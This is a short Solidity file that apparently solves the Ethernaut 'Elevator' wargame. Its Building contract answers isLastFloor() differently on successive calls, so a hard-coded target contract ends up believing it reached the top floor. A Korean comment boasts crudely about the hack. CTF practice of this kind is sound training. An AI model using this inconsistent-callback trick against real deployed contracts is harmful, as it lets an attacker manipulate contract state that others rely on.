// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ele {
    function goTo(uint256) external;
    function floor() external view returns (uint256);
}

// 천재새끼 ai 도움 없이 이걸 해킹해?
contract Building{
    Ele private elevator;

    constructor(){
        elevator = Ele(0xa7f00CB26c34C920016694b209c9072611E44221);
    }

    function attack(uint256 _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) public view returns(bool){
       if (elevator.floor() != _floor){
        return false;
       }
       return true;
    }

}